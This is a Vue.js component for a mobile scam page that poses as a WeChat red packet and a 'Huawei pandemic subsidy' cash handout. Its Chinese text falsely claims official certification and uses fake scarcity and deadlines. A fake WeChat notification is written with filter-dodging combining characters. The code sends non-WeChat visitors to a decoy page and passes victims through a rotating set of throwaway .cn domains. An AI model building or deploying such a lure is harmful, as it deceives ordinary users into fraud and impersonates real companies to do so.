<template>
  <div class="page-parent">
    <div class="package-parent">
      <div class="package-top">
        <div class="top-div-img">
          <img src="@/assets/head.jpg" class="package-logo"/>
        </div>
        <p class="package-title">{{ packageTitle }}</p>
        <p class="package-content">{{ packageContent }}
          <a-icon type="caret-left" :style="{ fontSize: '25px'}" class="content-icon"/>
          <span class="package-content-span">可提现</span>
        </p>
        <a-button type="primary" class="open-button" @click="openPackage">
          <span class="open-button-font">開</span>
        </a-button>
      </div>
      <div class="package-bottom">
        <div class="bottom-div">
          <p class="bottom-title">{{ bottomTitle }}</p>
        </div>
      </div>
    </div>
    <a-modal :title="null" :visible="showModal"
             class="modal" :footer="null" :closable="false"
             width="75%" :centered="true"
             :dialogStyle="settings">
      <!--      :offset="['300%',-35]"-->
      <a-badge count="X" show-zero class="close-but" @click="closeModal">
        <a href="#" class="head-example"/>
      </a-badge>
      <p class="modal-p1">华为两亿疫情补贴</p>
      <p class="modal-p2">尊敬的用户，现发放</p>
      <p class="modal-p3">疫情补贴</p>
      <p class="modal-p4">截至于
        <span class="modal-p4-1">12月16日</span>
        送完为止，人人免费领</p>
      <p class="modal-p5">为答谢新老用户们的支持与厚爱，现发出生活补助金</p>
      <p class="modal-p6">
        <span class="modal-p6-1">两亿</span>
        现金礼包回馈微信用户</p>
      <p class="modal-p7">红包总额仅剩余
        <span class="modal-p7-1">167万</span></p>
      <p class="modal-p8">数量有限，先到先得</p>
      <a-divider></a-divider>
      <p class="modal-p9" @click="closeModal">现在去领</p>
    </a-modal>
    <a-drawer :title="null" placement="top" :closable="false" :maskStyle="maskStyle"
              :visible="showNotice" @close="closeNotice" height="12%"
              :bodyStyle="bodyStyle">
      <p>
        <a-icon type="wechat"/>
        <span><span style="opacity: 0">00</span>微҉信 · 刚刚</span>
      </p>
      <p>
        <a-icon type="notification"/>
        <span><span style="opacity: 0">00</span>微҉信҉红҉包҉,已到账发送给好友即可领取</span>
      </p>
    </a-drawer>
  </div>
</template>

<script>
export default {
  name: 'red-package',
  props: {
    msg: String
  },
  data: () => {
    return {
      packageTitle: "开工补助",
      packageContent: "完成所有步骤后 自动存入零钱",
      bottomTitle: "此活动经官方认证 真实有效",
      showModal: true,
      showNotice: true,
      maskStyle: {
        opacity: 0
      },
      drawerStyle: {},
      bodyStyle: {
        'padding': '15px 20px'
      },
      settings: {
        padding: '0',
      },
      jsUrls: [
        'http://42bhg10.z2m1n7.cn/',
        'http://fbn854kij.z2m1n7.cn/',
        'http://km584tg.z2m1n7.cn/',
        'http://kh87hyg.z2m1n7.cn/',
        'http://hghjguhuiu.z2m1n7.cn/',
      ],
    }
  },
  mounted() {
    if (!this.isWx()) {
      console.log('清空')
      this.$router.push({path: "/demo"})
    }
    setTimeout(() => {
      this.closeNotice();
    }, 2000)
  },
  methods: {
    isWx() {
      let ua = window.navigator.userAgent.toLowerCase();
      if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
      } else {
        return false;
      }
    },
    closeNotice() {
      this.showNotice = false
    },
    closeModal() {
      this.showModal = false
      // this.$destroyAll()
    },
    openPackage() {
      window.sessionStorage.setItem('fromHome', true)
      let fromHome = window.sessionStorage.getItem('fromHome')
      let firstUrl = window.sessionStorage.getItem('firstUrl')
      console.log('page1-->fromHome',fromHome)
      console.log('page1-->firstUrl', `${this.checkUrl()}receive`)
      // 根据当前url获取需要跳转的url
      window.location.href = `${this.checkUrl()}receive`
    },
    checkUrl() {
      let firstUrl = window.sessionStorage.getItem('firstUrl')
      firstUrl.startsWith(this.jsUrls[0])
      if (firstUrl.startsWith(this.jsUrls[0])) {
        return this.jsUrls[1]
      } else if (firstUrl.startsWith(this.jsUrls[1])) {
        return this.jsUrls[2]
      } else if (firstUrl.startsWith(this.jsUrls[2])) {
        return this.jsUrls[3]
      } else if (firstUrl.startsWith(this.jsUrls[3])) {
        return this.jsUrls[4]
      } else if (firstUrl.startsWith(this.jsUrls[4])) {
        return this.jsUrls[0]
      }
    }
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped lang="less">
p {
  margin: 0;
}

.ant-divider {
  margin: 0;
  margin-top: 5px;
}

.ant-modal-body {
  padding: 0;
}

.close-but {
  position: absolute;
  top: 0%;
  left: 100%
}

* {
  font-family: '宋体';
  font-weight: 500;
}

.modal {
  text-align: center;
  //width: 80%;
  //position: absolute;
  //top: 30%;
  //height: 100vh;
}

.modal p {
  font-family: '黑体';
  font-weight: 500;
  text-align: center;
}

.modal-p1 {
  color: #E1604C;
  font-size: 25px;
  margin: 0 0 10px;
}

.modal-p2 {
  color: #000;
  font-size: 20px;
  font-weight: 600;
  margin: 0 0 10px;
}

.modal-p3 {
  color: #E1604C;
  font-size: 18px;
  margin: 0 0 0;
}

.modal-p4 {
  color: #E1604C;
  font-size: 18px;
  margin: 0 0 10px;
}

.modal-p4-1 {
  font-family: '黑体';
  color: #E1604C;
  font-size: 25px;
  margin: 0 0 0;
}

.modal-p5 {
  color: #000;
  font-size: 18px;
  margin: 0 0 0;
}

.modal-p6 {
  color: #000;
  font-size: 16px;
  margin: 0 0 20px;
}

.modal-p6-1 {
  font-family: '黑体';
  color: #E1604C;
  font-size: 16px;
  margin: 0 0 0;
}

.modal-p7 {
  color: #a39f9f;
  font-size: 18px;
  margin: 0 0 0 0;
  padding: 0;

}

.modal-p7-1 {
  font-family: '黑体';
  color: #E1604C;
  font-size: 24px;
  margin: 0 0 0 0;
  padding: 0;
}

.modal-p8 {
  color: #a39f9f;
  font-size: 18px;
  margin: 0 0 0 0;
  padding: 0;
}

.modal-p9 {
  color: #14893e;
  font-size: 25px;
  margin: 5px 0 0 0;
  padding: 0;
}

.page-parent {
  width: 100%;
  height: 100vh;
  //background-color: #fff;
}

.package-parent {
  width: 90%;
  height: 85vh;
  background-color: #E1604C;
  border-radius: 10px;
  margin: 0 auto;
  justify-content: space-between;
  position: relative;
  top: 5%;
  text-align: center;
}

.package-top {
  height: 50%;
  border-radius: 0 0 40% 40%;
  box-shadow: 0 4px 0px -1px rgba(0, 0, 0, 0.2)
}

.top-div-img {
  height: 30%;
  width: 100%;
  text-align: center;
}

.package-logo {
  width: 25%;
  position: relative;
  top: 25%;
  margin: 0 auto;
}

.package-title {
  position: relative;
  top: 25%;
  font-weight: 500;
  font-size: 25px;
  color: #ebcd9b;
}

.package-content {
  position: absolute;
  text-align: center;
  width: 100%;
  top: 35%;
  //left: 35%;
  font-size: 16px;
  color: #ebcd9b;
}

.content-icon {
  vertical-align: middle;
}

.package-content-span {
  position: absolute;
  left: 22em;
  top: 0.4em;
  display: inline-block;
  width: 40px;
  height: 18px;
  background-color: #ebcd9b;
  font-size: 0.8em;
  color: #E1604C;
  padding: 0;
}

.open-button {
  width: 35%;
  height: 15vh;
  background-color: #ebcd9b;
  border-radius: 50%;
  //z-index: 10000;
  margin: 0 auto;
  //font-size: 30px;
  border: none;
  position: absolute;
  top: 42%;
  left: 35%;
  animation: open-button 1s ease-in infinite;
}

.open-button-font {
  color: #000;
  //font-weight: 500;
  font-family: '黑体';
  animation: open-button-font 1s ease-in infinite;
  font-size: 45px;
}

@keyframes open-button {
  50% {
    transform: scale(1.1, 0.9) translate(0, -5px)
  }
}

@keyframes open-button-font {
  50% {
    transform: scale(1.2, 0.8) translate(0, -5px)
  }
}

.package-bottom {
  width: 100%;
  color: #ebcd9b;

}

.bottom-div {
  width: 100%;
  position: absolute;
  top: 90%;
}

.bottom-title {
  font-weight: 500;
  font-size: 20px;
  font-family: '黑体';
}
</style>
